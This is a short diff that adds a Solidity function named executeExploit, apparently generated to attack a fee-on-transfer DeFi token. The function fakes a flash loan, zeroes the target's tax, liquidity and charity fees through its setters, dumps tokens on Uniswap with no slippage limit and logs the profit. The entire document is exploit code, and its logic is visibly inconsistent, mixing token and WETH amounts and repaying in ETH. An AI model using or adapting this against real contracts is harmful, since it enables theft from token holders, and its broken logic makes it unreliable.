@@ -1,0 +1,38 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Simulate a flash loan
+    IERC20(valuableToken).transfer(address(this), amount);
+    uint256 initialValuableBalance = valuableToken.balanceOf(address(this));
+    
+    // Check if we have any valuableToken balance now
+    console.log("Current valuable balance: %s", initialValuableBalance);
+
+    // Step 2: Perform actions to exploit the flaw
+    // Set the fees to zero to avoid losing tokens on transfer
+    ILiquidityGeneratorToken(target).setTaxFeePercent(0);
+    ILiquidityGeneratorToken(target).setLiquidityFeePercent(0);
+    ILiquidityGeneratorToken(target).setCharityFeePercent(0);
+
+    // Step 3: Swap tokens to acquire more WETH
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+    uint256 amountOutMin = 1; // Set this to 1 to allow swap regardless of the output value
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(initialValuableBalance, amountOutMin, path, address(this), block.timestamp);
+
+    // Step 4: Withdraw the acquired WETH
+    uint256 wethBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    console.log("WETH Balance after swap: %s", wethBalance);
+    
+    if (wethBalance > amount) {
+        console.log("We have profit after selling the tokens for WETH!");
+    }
+
+    // Step 5: Repay the flash loan
+    uint256 surplusToRepay = wethBalance > amount ? amount : wethBalance;
+    IWETH(uniswapRouter.WETH()).withdraw(surplusToRepay);
+    payable(flashloanProvider).transfer(surplusToRepay);
+}
+</executeExploitCode>
+```
